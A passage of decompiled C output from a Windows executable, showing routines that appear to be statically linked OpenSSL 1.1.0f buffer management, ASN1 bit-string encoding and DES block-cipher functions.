  v6 = *a1;
  if ( !v6 )
    return 1i64;
  v7 = *(_QWORD *)(a4 + 24);
  if ( !v7 )
    return 1i64;
  if ( (*(_BYTE *)(v7 + 8) & 2) == 0 )
    return 1i64;
  v8 = v6 + *(int *)(v7 + 32);
  if ( !v8 )
    return 1i64;
  sub_14001D930(*(void **)v8);
  result = (__int64)sub_14001D8E0(v4);
  *(_QWORD *)v8 = result;
  if ( result )
  {
    memmove((void *)result, a2, v4);
    result = 1i64;
    *(_DWORD *)(v8 + 8) = v4;
    *(_DWORD *)(v8 + 12) = 0;
  }
  return result;
}

//----- (0000000140082250) ----------------------------------------------------
__int64 __fastcall sub_140082250(_QWORD *a1, __int64 a2)
{
  return *(unsigned int *)(*(int *)(a2 + 4) + *a1);
}

//----- (0000000140082260) ----------------------------------------------------
__int64 __fastcall sub_140082260(_QWORD *a1, __int64 a2)
{
  return *a1 + *(unsigned int *)(a2 + 8);
}

//----- (0000000140082270) ----------------------------------------------------
__int64 __fastcall sub_140082270(_QWORD *a1, int a2, __int64 a3)
{
  _DWORD *v3; // r9
  __int64 result; // rax

  v3 = (_DWORD *)(*a1 + *(int *)(a3 + 4));
  result = (unsigned int)*v3;
  *v3 = a2;
  return result;
}

//----- (0000000140082280) ----------------------------------------------------
void __fastcall sub_140082280(__int64 a1)
{
  void *v2; // rcx

  if ( a1 )
  {
    v2 = *(void **)(a1 + 8);
    if ( v2 )
    {
      if ( (*(_BYTE *)(a1 + 24) & 1) != 0 )
        sub_140041990(v2);
      else
        sub_14001DA40(v2, *(_QWORD *)(a1 + 16), (__int64)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c", 0x34u);
    }
    sub_14001D930((void *)a1);
  }
}

//----- (00000001400822F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400822F0(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rax
  unsigned __int64 result; // rax
  __int64 v6; // rcx
  size_t v7; // rsi
  char *v8; // rax
  size_t v9; // r8
  char *v10; // rcx

  v2 = *(_QWORD *)a1;
  if ( *(_QWORD *)a1 < a2 )
  {
    if ( *(_QWORD *)(a1 + 16) < a2 )
    {
      if ( a2 <= 0x5FFFFFFC )
      {
        v7 = 4 * ((a2 + 3) / 3);
        if ( (*(_BYTE *)(a1 + 24) & 1) != 0 )
          v8 = (char *)sub_1400826C0(a1, v7);
        else
          v8 = (char *)sub_14001D970(
                         *(void **)(a1 + 8),
                         v7,
                         (__int64)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c",
                         0x60u);
        if ( v8 )
        {
          *(_QWORD *)(a1 + 8) = v8;
          v9 = a2 - *(_QWORD *)a1;
          v10 = &v8[*(_QWORD *)a1];
          *(_QWORD *)(a1 + 16) = v7;
          memset(v10, 0, v9);
          result = a2;
          *(_QWORD *)a1 = a2;
        }
        else
        {
          sub_140024610(7, 100, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c", 98);
          return 0i64;
        }
      }
      else
      {
        sub_140024610(7, 100, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c", 89);
        return 0i64;
      }
    }
    else
    {
      v6 = *(_QWORD *)(a1 + 8);
      if ( v6 )
        memset((void *)(v2 + v6), 0, a2 - v2);
      *(_QWORD *)a1 = a2;
      return a2;
    }
  }
  else
  {
    *(_QWORD *)a1 = a2;
    return a2;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140082440) ----------------------------------------------------
unsigned __int64 __fastcall sub_140082440(__int64 a1, unsigned __int64 a2)
{
  __int64 v4; // rdx
  __int64 v5; // rax
  unsigned __int64 result; // rax
  size_t v7; // r10
  char *v8; // rax
  size_t v9; // r8
  char *v10; // rcx

  v4 = *(_QWORD *)a1;
  if ( *(_QWORD *)a1 < a2 )
  {
    v7 = *(_QWORD *)(a1 + 16);
    if ( v7 < a2 )
    {
      if ( a2 <= 0x5FFFFFFC )
      {
        if ( (*(_BYTE *)(a1 + 24) & 1) != 0 )
          v8 = (char *)sub_1400826C0(a1, 4 * ((a2 + 3) / 3));
        else
          v8 = (char *)sub_14001DAC0(
                         *(void **)(a1 + 8),
                         v7,
                         4 * ((a2 + 3) / 3),
                         (__int64)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c",
                         0x86u);
        if ( v8 )
        {
          *(_QWORD *)(a1 + 8) = v8;
          v9 = a2 - *(_QWORD *)a1;
          v10 = &v8[*(_QWORD *)a1];
          *(_QWORD *)(a1 + 16) = 4 * ((a2 + 3) / 3);
          memset(v10, 0, v9);
          result = a2;
          *(_QWORD *)a1 = a2;
        }
        else
        {
          sub_140024610(7, 105, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c", 136);
          return 0i64;
        }
      }
      else
      {
        sub_140024610(7, 105, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c", 127);
        return 0i64;
      }
    }
    else
    {
      memset((void *)(v4 + *(_QWORD *)(a1 + 8)), 0, a2 - v4);
      result = a2;
      *(_QWORD *)a1 = a2;
    }
  }
  else
  {
    v5 = *(_QWORD *)(a1 + 8);
    if ( v5 )
      memset((void *)(v5 + a2), 0, v4 - a2);
    *(_QWORD *)a1 = a2;
    return a2;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400825B0) ----------------------------------------------------
void *__fastcall sub_1400825B0()
{
  int v0; // eax
  void *result; // rax

  result = sub_14001DC20((unsigned int)(v0 - 24));
  if ( !result )
  {
    sub_140024610(7, 101, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c", 37);
    return 0i64;
  }
  return result;
}
// 1400825C8: variable 'v0' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140082600) ----------------------------------------------------
_DWORD *__fastcall sub_140082600(int a1)
{
  int v1; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v1 - 16));
  if ( result )
  {
    result[6] = a1;
  }
  else
  {
    sub_140024610(7, 101, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\buffer\\buffer.c", 37);
    return 0i64;
  }
  return result;
}
// 140082615: variable 'v1' is possibly undefined

//----- (0000000140082660) ----------------------------------------------------
__int64 __fastcall sub_140082660(unsigned __int8 *a1, unsigned __int8 *a2, unsigned __int64 a3)
{
  unsigned __int8 *v3; // r9
  unsigned __int8 *i; // rcx
  __int64 result; // rax
  unsigned __int8 *v6; // rdx
  unsigned __int64 j; // r8
  unsigned __int8 v8; // cl

  v3 = a1;
  if ( a2 )
  {
    for ( i = &a1[a3 - 1]; a3; --a3 )
    {
      result = *a2++;
      *i-- = result;
    }
  }
  else
  {
    v6 = &a1[a3 - 1];
    for ( j = a3 >> 1; j; --j )
    {
      result = *v3++;
      v8 = *v6;
      *v6-- = result;
      *(v3 - 1) = v8;
    }
  }
  return result;
}

//----- (00000001400826C0) ----------------------------------------------------
void *__fastcall sub_1400826C0(__int64 a1, size_t a2)
{
  void *result; // rax
  const void *v4; // rdx
  void *v5; // rbx

  result = sub_1400419B0(a2);
  v4 = *(const void **)(a1 + 8);
  v5 = result;
  if ( v4 )
  {
    if ( result )
      memmove(result, v4, *(_QWORD *)a1);
    sub_140041990(*(void **)(a1 + 8));
    return v5;
  }
  return result;
}

//----- (0000000140082730) ----------------------------------------------------
_BOOL8 __fastcall sub_140082730(__int64 a1, int a2)
{
  int v2; // eax
  __int64 v3; // r8

  v2 = a2 / 8;
  return a1
      && *(_DWORD *)a1 >= v2 + 1
      && (v3 = *(_QWORD *)(a1 + 8)) != 0
      && ((unsigned __int8)(1 << (7 - (a2 & 7))) & *(_BYTE *)(v2 + v3)) != 0;
}

//----- (0000000140082780) ----------------------------------------------------
__int64 __fastcall sub_140082780(int *a1, int a2, int a3)
{
  int v4; // r14d
  __int64 v5; // rbp
  __int64 result; // rax
  char v7; // r15
  size_t v8; // rcx
  int v9; // edi
  char *v10; // rsi
  __int64 v11; // rcx
  int v12; // eax
  __int64 v13; // rcx

  v4 = 1 << (7 - (a2 & 7));
  v5 = a2 / 8;
  result = 0i64;
  v7 = ~(_BYTE)v4;
  if ( !a3 )
    LOBYTE(v4) = 0;
  if ( a1 )
  {
    a1[4] &= 0xFFFFFFF0;
    v8 = *a1;
    v9 = v5 + 1;
    if ( (int)v8 < (int)v5 + 1 || !*((_QWORD *)a1 + 1) )
    {
      if ( !a3 )
        return 1i64;
      v10 = (char *)sub_14001DAC0(
                      *((void **)a1 + 1),
                      v8,
                      v9,
                      (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_bitstr.c",
                      0x9Fu);
      if ( !v10 )
      {
        sub_140024610(13, 183, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_bitstr.c", 161);
        return 0i64;
      }
      v11 = *a1;
      v12 = v5 - v11 + 1;
      if ( v12 > 0 )
        memset(&v10[v11], 0, v12);
      *((_QWORD *)a1 + 1) = v10;
      *a1 = v9;
    }
    *(_BYTE *)(*((_QWORD *)a1 + 1) + v5) = v4 | v7 & *(_BYTE *)(*((_QWORD *)a1 + 1) + v5);
    if ( *a1 > 0 )
    {
      v13 = *((_QWORD *)a1 + 1);
      do
      {
        if ( *(_BYTE *)(*a1 - 1 + v13) )
          break;
        --*a1;
      }
      while ( *a1 > 0 );
    }
    return 1i64;
  }
  return result;
}

//----- (00000001400828C0) ----------------------------------------------------
_DWORD *__fastcall sub_1400828C0(_QWORD *a1, _QWORD *a2, int a3)
{
  int v3; // eax
  _BYTE *v4; // r14
  _DWORD *v8; // rbx
  int v9; // r8d
  unsigned int v10; // r15d
  char *v11; // rsi
  int v12; // eax
  int v13; // ebp
  _BYTE *v14; // rax
  void *v16; // rcx

  v4 = 0i64;
  v8 = 0i64;
  if ( a3 < 1 )
  {
    v9 = v3 + 104;
LABEL_11:
    sub_140024610(13, 189, v9, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_bitstr.c", 131);
    if ( !a1 || (_DWORD *)*a1 != v8 )
      sub_14004FD70((__int64)v8);
    return 0i64;
  }
  if ( !a1 || (v8 = (_DWORD *)*a1) == 0i64 )
  {
    v8 = sub_14004FDA0();
    if ( !v8 )
      return 0i64;
  }
  v10 = *(unsigned __int8 *)*a2;
  v11 = (char *)(*a2 + 1i64);
  if ( v10 > 7 )
  {
    v9 = 220;
    goto LABEL_11;
  }
  v8[4] &= 0xFFFFFFF8;
  v8[4] |= v10 | 8;
  v12 = a3;
  v13 = a3 - 1;
  if ( v12 > 1 )
  {
    v14 = sub_14001D8E0(v13);
    v4 = v14;
    if ( !v14 )
    {
      v9 = 65;
      goto LABEL_11;
    }
    memmove(v14, v11, v13);
    v4[v13 - 1] &= -1 << v10;
    v11 += v13;
  }
  v16 = (void *)*((_QWORD *)v8 + 1);
  *v8 = v13;
  sub_14001D930(v16);
  *((_QWORD *)v8 + 1) = v4;
  v8[1] = 3;
  if ( a1 )
    *a1 = v8;
  *a2 = v11;
  return v8;
}
// 1400828FA: variable 'v3' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140082A20) ----------------------------------------------------
__int64 __fastcall sub_140082A20(int *a1, _BYTE **a2)
{
  int v4; // edx
  int v5; // edi
  __int64 v6; // r8
  __int64 v7; // rax
  char v8; // al
  unsigned int v9; // ebp
  _BYTE *v10; // rsi
  char *v11; // rsi
  __int64 v12; // rbx

  if ( !a1 )
    return 0i64;
  v4 = *a1;
  if ( *a1 <= 0 )
  {
LABEL_23:
    LOBYTE(v5) = 0;
    goto LABEL_24;
  }
  v5 = a1[4];
  if ( (v5 & 8) == 0 )
  {
    v6 = *((_QWORD *)a1 + 1);
    v7 = *a1;
    do
    {
      if ( *(_BYTE *)(v6 + v7 - 1) )
        break;
      --v4;
      --v7;
    }
    while ( v7 > 0 );
    v8 = *(_BYTE *)(v4 - 1 + v6);
    if ( (v8 & 1) == 0 )
    {
      if ( (v8 & 2) != 0 )
      {
        LOBYTE(v5) = 1;
      }
      else if ( (v8 & 4) != 0 )
      {
        LOBYTE(v5) = 2;
      }
      else if ( (v8 & 8) != 0 )
      {
        LOBYTE(v5) = 3;
      }
      else if ( (v8 & 0x10) != 0 )
      {
        LOBYTE(v5) = 4;
      }
      else if ( (v8 & 0x20) != 0 )
      {
        LOBYTE(v5) = 5;
      }
      else if ( (v8 & 0x40) != 0 )
      {
        LOBYTE(v5) = 6;
      }
      else
      {
        v5 = v8 < 0 ? 7 : 0;
      }
      goto LABEL_24;
    }
    goto LABEL_23;
  }
  LOBYTE(v5) = v5 & 7;
LABEL_24:
  v9 = v4 + 1;
  if ( a2 )
  {
    v10 = *a2;
    *v10 = v5;
    v11 = v10 + 1;
    if ( v4 > 0 )
    {
      v12 = v4;
      memmove(v11, *((const void **)a1 + 1), v4);
      v11 += v12;
      *(v11 - 1) &= -1 << v5;
    }
    *a2 = v11;
  }
  return v9;
}

//----- (0000000140082B40) ----------------------------------------------------
__int64 __fastcall sub_140082B40(unsigned int *a1, unsigned int *a2, unsigned int *a3, unsigned int *a4)
{
  int v7; // eax
  int v8; // r10d
  int v9; // r11d
  int v10; // ecx
  unsigned int v11; // r11d
  int v12; // r10d
  int v13; // eax
  unsigned int v14; // r10d
  int v15; // r11d
  int v16; // eax
  unsigned int v17; // r11d
  int v18; // r10d
  int v19; // eax
  unsigned int v20; // edx
  int v21; // r8d
  int v22; // eax
  unsigned int v23; // r8d
  int v24; // edx
  int v25; // eax
  int v26; // edx
  int v27; // r8d
  int v28; // ecx
  unsigned int v29; // r8d
  int v30; // edx
  int v31; // eax
  int v32; // ecx
  __int64 result; // rax

  v7 = (*a1 ^ (a1[1] >> 4)) & 0xF0F0F0F;
  v8 = v7 ^ *a1;
  v9 = (16 * v7) ^ a1[1];
  v10 = (unsigned __int16)(v9 ^ HIWORD(v8));
  v11 = v10 ^ v9;
  v12 = (v10 << 16) ^ v8;
  v13 = (v12 ^ (v11 >> 2)) & 0x33333333;
  v14 = v13 ^ v12;
  v15 = (4 * v13) ^ v11;
  v16 = (v15 ^ (v14 >> 8)) & 0xFF00FF;
  v17 = v16 ^ v15;
  v18 = (v16 << 8) ^ v14;
  *a1 = v18 ^ (v18 ^ (v17 >> 1)) & 0x55555555;
  a1[1] = v17 ^ (2 * ((v18 ^ (v17 >> 1)) & 0x55555555));
  sub_140084620(a1, a4, 0);
  sub_140084620(a1, a3, 1);
  sub_140084620(a1, a2, 0);
  v19 = (*a1 ^ (a1[1] >> 1)) & 0x55555555;
  v20 = v19 ^ *a1;
  v21 = (2 * v19) ^ a1[1];
  v22 = (v21 ^ (v20 >> 8)) & 0xFF00FF;
  v23 = v22 ^ v21;
  v24 = (v22 << 8) ^ v20;
  v25 = (v24 ^ (v23 >> 2)) & 0x33333333;
  v26 = v25 ^ v24;
  v27 = (4 * v25) ^ v23;
  v28 = (unsigned __int16)(v27 ^ HIWORD(v26));
  v29 = v28 ^ v27;
  v30 = (v28 << 16) ^ v26;
  v31 = (v30 ^ (v29 >> 4)) & 0xF0F0F0F;
  v32 = 16 * v31;
  result = v30 ^ (unsigned int)v31;
  *a1 = result;
  a1[1] = v29 ^ v32;
  return result;
}

//----- (0000000140082CA0) ----------------------------------------------------
__int64 __fastcall sub_140082CA0(
        unsigned __int16 *a1,
        __int64 a2,
        int a3,
        __int64 a4,
        unsigned int *a5,
        unsigned int *a6,
        unsigned __int16 *a7,
        int a8)
{
  unsigned int *v8; // r10
  int *v11; // r13
  int v12; // esi
  unsigned int *v13; // r11
  unsigned int *v14; // r12
  int v15; // r10d
  unsigned int v16; // r8d
  unsigned __int64 v17; // r15
  int v18; // ecx
  int v19; // ecx
  int v20; // eax
  char *v21; // r14
  int v22; // ecx
  int v23; // edx
  int v24; // ecx
  int v25; // eax
  int v26; // eax
  int v27; // eax
  int v28; // edx
  int v29; // eax
  int v30; // eax
  int v32; // edi
  int v33; // r13d
  __int64 v34; // r15
  unsigned int *v35; // r8
  unsigned int *v36; // r11
  int v37; // ecx
  int v38; // r12d
  int v39; // r12d
  unsigned int v40; // r13d
  unsigned __int64 v41; // r15
  unsigned int v42; // esi
  int v43; // edi
  int v44; // edi
  int v45; // eax
  int v46; // edi
  unsigned int v47; // ecx
  int v48; // edx
  int v49; // ecx
  int v50; // esi
  int v51; // edx
  unsigned int v52; // edx
  int v53; // r8d
  __int64 v54; // rbx
  int v55; // [rsp+60h] [rbp+40h] BYREF
  unsigned int v56; // [rsp+64h] [rbp+44h]
  __int64 v57; // [rsp+68h] [rbp+48h]
  unsigned int *v58; // [rsp+78h] [rbp+58h]

  v58 = (unsigned int *)a4;
  v8 = (unsigned int *)a4;
  if ( a8 )
  {
    v11 = (int *)a7;
    v12 = a3 - 8;
    v13 = a6;
    v14 = v58;
    v15 = (*((unsigned __int8 *)a7 + 3) << 24) | (*((unsigned __int8 *)a7 + 2) << 16) | *a7;
    v16 = *((_DWORD *)a7 + 1);
    if ( v12 >= 0 )
    {
      v17 = (unsigned __int64)(unsigned int)(v12 + 8) >> 3;
      v12 -= 8 * ((unsigned int)(v12 + 8) >> 3);
      do
      {
        v18 = a1[2];
        v55 = v15 ^ ((*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1);
        v19 = (*((unsigned __int8 *)a1 + 6) << 16) | v18;
        v20 = *((unsigned __int8 *)a1 + 7) << 24;
        a1 += 4;
        v56 = v16 ^ (v20 | v19);
        sub_1400858A0((unsigned int *)&v55, v14, a5, v13);
        v15 = v55;
        v16 = v56;
        v13 = a6;
        *(_WORD *)a2 = v55;
        *(_BYTE *)(a2 + 2) = BYTE2(v15);
        *(_BYTE *)(a2 + 3) = HIBYTE(v15);
        *(_DWORD *)(a2 + 4) = v16;
        a2 += 8i64;
        --v17;
      }
      while ( v17 );
    }
    if ( v12 != -8 )
    {
      v21 = (char *)a1 + v12 + 8;
      v22 = 0;
      v23 = 0;
      switch ( v12 )
      {
        case -7:
          goto LABEL_14;
        case -6:
          goto LABEL_13;
        case -5:
          goto LABEL_12;
        case -4:
          goto LABEL_11;
        case -3:
          goto LABEL_10;
        case -2:
          goto LABEL_9;
        case -1:
          goto LABEL_8;
        case 0:
          v24 = (unsigned __int8)*--v21;
          v22 = v24 << 24;
LABEL_8:
          v25 = (unsigned __int8)*--v21;
          v22 |= v25 << 16;
LABEL_9:
          v26 = (unsigned __int8)*--v21;
          v22 |= v26 << 8;
LABEL_10:
          v27 = (unsigned __int8)*--v21;
          v22 |= v27;
LABEL_11:
          v28 = (unsigned __int8)*--v21;
          v23 = v28 << 24;
LABEL_12:
          v29 = (unsigned __int8)*--v21;
          v23 |= v29 << 16;
LABEL_13:
          v30 = (unsigned __int8)*--v21;
          v23 |= v30 << 8;
LABEL_14:
          v23 |= (unsigned __int8)*(v21 - 1);
          break;
        default:
          break;
      }
      v55 = v15 ^ v23;
      v56 = v16 ^ v22;
      sub_1400858A0((unsigned int *)&v55, v14, a5, v13);
      v15 = v55;
      v16 = v56;
      *(_WORD *)a2 = v55;
      *(_BYTE *)(a2 + 2) = BYTE2(v15);
      *(_BYTE *)(a2 + 3) = HIBYTE(v15);
      *(_DWORD *)(a2 + 4) = v16;
    }
    *v11 = v15;
    v11[1] = v16;
    return HIWORD(v16);
  }
  else
  {
    v32 = a3 - 8;
    v33 = *((unsigned __int8 *)a7 + 4);
    v34 = (__int64)a7 + 1;
    v35 = a6;
    v36 = a5;
    v37 = *((unsigned __int8 *)a7 + 7) << 8;
    v38 = (*((unsigned __int8 *)a7 + 2) << 16) | *a7;
    v57 = (__int64)a7 + 1;
    v39 = (*((unsigned __int8 *)a7 + 3) << 24) | v38;
    v40 = ((*((unsigned __int8 *)a7 + 6) | v37) << 16) | (*((unsigned __int8 *)a7 + 5) << 8) | v33;
    if ( v32 >= 0 )
    {
      v41 = (unsigned __int64)(unsigned int)(v32 + 8) >> 3;
      a8 = v32 - 8 * ((unsigned int)(v32 + 8) >> 3);
      do
      {
        v43 = a1[2];
        v55 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
        v42 = v55;
        v44 = (*((unsigned __int8 *)a1 + 6) << 16) | v43;
        v45 = *((unsigned __int8 *)a1 + 7) << 24;
        a1 += 4;
        v46 = v45 | v44;
        v56 = v46;
        sub_140082B40((unsigned int *)&v55, v8, v36, v35);
        v47 = v39 ^ v55;
        v8 = v58;
        v48 = v40 ^ v56;
        v35 = a6;
        v36 = a5;
        v39 = v42;
        *(_DWORD *)a2 = v47;
        v40 = v46;
        *(_DWORD *)(a2 + 4) = v48;
        a2 += 8i64;
        --v41;
      }
      while ( v41 );
      v34 = v57;
      v32 = a8;
    }
    if ( v32 != -8 )
    {
      v49 = *((unsigned __int8 *)a1 + 7) << 8;
      v50 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
      v51 = a1[2];
      v55 = v50;
      a8 = ((*((unsigned __int8 *)a1 + 6) | v49) << 16) | v51;
      v56 = a8;
      sub_140082B40((unsigned int *)&v55, v8, v36, v35);
      v52 = v39 ^ v55;
      v53 = v40 ^ v56;
      v54 = v32 + 8 + a2;
      switch ( v32 )
      {
        case -7:
          goto LABEL_30;
        case -6:
          goto LABEL_29;
        case -5:
          goto LABEL_28;
        case -4:
          goto LABEL_27;
        case -3:
          goto LABEL_26;
        case -2:
          goto LABEL_25;
        case -1:
          goto LABEL_24;
        case 0:
          *(_BYTE *)--v54 = HIBYTE(v53);
LABEL_24:
          *(_BYTE *)--v54 = BYTE2(v53);
LABEL_25:
          *(_BYTE *)--v54 = BYTE1(v53);
LABEL_26:
          *(_BYTE *)--v54 = v53;
LABEL_27:
          *(_BYTE *)--v54 = HIBYTE(v52);
LABEL_28:
          *(_BYTE *)--v54 = BYTE2(v52);
LABEL_29:
          *(_BYTE *)--v54 = BYTE1(v52);
LABEL_30:
          *(_BYTE *)(v54 - 1) = v52;
          break;
        default:
          break;
      }
      v40 = a8;
      v39 = v50;
    }
    *(_BYTE *)a7 = v39;
    *(_BYTE *)v34 = BYTE1(v39);
    *(_BYTE *)(v34 + 1) = BYTE2(v39);
    *(_BYTE *)(v34 + 2) = HIBYTE(v39);
    *(_DWORD *)(v34 + 3) = v40;
    return HIWORD(v40);
  }
}

//----- (0000000140083220) ----------------------------------------------------
__int64 __fastcall sub_140083220(_DWORD *a1, unsigned int *a2, int a3)
{
  int v4; // eax
  int v5; // r9d
  int v6; // r10d
  int v7; // ecx
  unsigned int v8; // r10d
  int v9; // r9d
  int v10; // eax
  unsigned int v11; // r9d
  int v12; // r10d
  int v13; // eax
  unsigned int v14; // r10d
  int v15; // r9d
  unsigned int v16; // ebx
  int v17; // r11d
  unsigned __int64 v18; // r8
  unsigned int v19; // r9d
  unsigned int v20; // r11d
  unsigned int v21; // r9d
  unsigned int v22; // ebx
  unsigned int v23; // r9d
  unsigned int v24; // r11d
  unsigned int v25; // r9d
  unsigned int v26; // ebx
  unsigned int v27; // r11d
  unsigned int v28; // r9d
  unsigned __int64 v29; // r8
  unsigned int v30; // ebx
  unsigned int v31; // r9d
  unsigned __int64 v32; // r8
  unsigned int v33; // r11d
  unsigned int v34; // r9d
  unsigned __int64 v35; // r8
  unsigned int v36; // ebx
  unsigned int v37; // r9d
  unsigned __int64 v38; // r8
  unsigned int v39; // r11d
  unsigned __int64 v40; // r8
  unsigned int v41; // r9d
  unsigned int v42; // ebx
  unsigned int v43; // r9d
  unsigned __int64 v44; // r8
  unsigned int v45; // r11d
  unsigned int v46; // r9d
  unsigned int v47; // ebx
  unsigned int v48; // r9d
  unsigned int v49; // r11d
  unsigned int v50; // r9d
  unsigned int v51; // ebx
  unsigned int v52; // r9d
  unsigned int v53; // r11d
  unsigned __int64 v54; // r9
  unsigned __int64 v55; // r8
  int v56; // edx
  unsigned __int64 v57; // r8
  unsigned int v58; // r9d
  unsigned int v59; // r11d
  unsigned int v60; // r9d
  unsigned int v61; // ebx
  unsigned int v62; // r9d
  unsigned int v63; // r11d
  unsigned int v64; // r9d
  unsigned int v65; // ebx
  unsigned int v66; // r9d
  unsigned __int64 v67; // r8
  unsigned int v68; // r11d
  unsigned int v69; // r9d
  unsigned __int64 v70; // r8
  unsigned int v71; // ebx
  unsigned int v72; // r9d
  unsigned __int64 v73; // r8
  unsigned int v74; // r11d
  unsigned int v75; // r9d
  unsigned __int64 v76; // r8
  unsigned int v77; // ebx
  unsigned int v78; // r9d
  unsigned __int64 v79; // r8
  unsigned int v80; // r11d
  unsigned __int64 v81; // r8
  unsigned int v82; // r9d
  unsigned int v83; // ebx
  unsigned int v84; // r9d
  unsigned __int64 v85; // r8
  unsigned int v86; // r11d
  unsigned int v87; // r9d
  unsigned __int64 v88; // r8
  unsigned int v89; // ebx
  unsigned int v90; // r9d
  unsigned __int64 v91; // r8
  unsigned int v92; // r11d
  unsigned int v93; // r9d
  unsigned __int64 v94; // r8
  unsigned __int64 v95; // r8
  unsigned int v96; // r9d
  int v97; // r11d
  unsigned int v98; // ebx
  int v99; // eax
  unsigned int v100; // r11d
  int v101; // ebx
  int v102; // eax
  unsigned int v103; // ebx
  int v104; // r11d
  int v105; // eax
  int v106; // r11d
  int v107; // ebx
  int v108; // ecx
  unsigned int v109; // ebx
  int v110; // r11d
  int v111; // eax
  int v112; // ecx
  __int64 result; // rax

  v4 = (*a1 ^ (a1[1] >> 4)) & 0xF0F0F0F;
  v5 = v4 ^ *a1;
  v6 = (16 * v4) ^ a1[1];
  v7 = (unsigned __int16)(v6 ^ HIWORD(v5));
  v8 = v7 ^ v6;
  v9 = (v7 << 16) ^ v5;
  v10 = (v9 ^ (v8 >> 2)) & 0x33333333;
  v11 = v10 ^ v9;
  v12 = (4 * v10) ^ v8;
  v13 = (v12 ^ (v11 >> 8)) & 0xFF00FF;
  v14 = v13 ^ v12;
  v15 = (v13 << 8) ^ v11;
  v16 = __ROR4__(v15 ^ (v15 ^ (v14 >> 1)) & 0x55555555, 29);
  v17 = __ROR4__(v14 ^ (2 * ((v15 ^ (v14 >> 1)) & 0x55555555)), 29);
  if ( a3 )
  {
    v18 = v16 ^ (unsigned __int64)*a2;
    v19 = __ROR4__(v16 ^ a2[1], 4);
    v20 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v19 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v18 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v19 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int16)v18 >> 10)
                                                                                               + 128) ^ *((_DWORD *)&unk_140111E00 + ((v18 >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v18 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v19 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v19 >> 18) & 0x3F) + 320) ^ v17;
    v21 = __ROR4__(v20 ^ a2[3], 4);
    v22 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v21 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v20 ^ (unsigned __int64)a2[2]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + (((v20 ^ (unsigned __int64)a2[2]) >> 10) & 0x3F)
                                                                                       + 128) ^ *((_DWORD *)&unk_140111E00
                                                                                                + (((v20 ^ (unsigned __int64)a2[2]) >> 18) & 0x3F)
                                                                                                + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v21 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v21 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v21 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v20 ^ (unsigned __int64)a2[2]) >> 2) & 0x3F)) ^ v16;
    v23 = __ROR4__(v22 ^ a2[5], 4);
    v24 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v23 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v22 ^ (unsigned __int64)a2[4]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v23 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v23 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v22 ^ (unsigned __int64)a2[4]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v22 ^ (unsigned __int64)a2[4]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v23 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v22 ^ (unsigned __int64)a2[4]) >> 2) & 0x3F)) ^ v20;
    v25 = __ROR4__(v24 ^ a2[7], 4);
    v26 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v25 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v24 ^ (unsigned __int64)a2[6]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v25 >> 10)
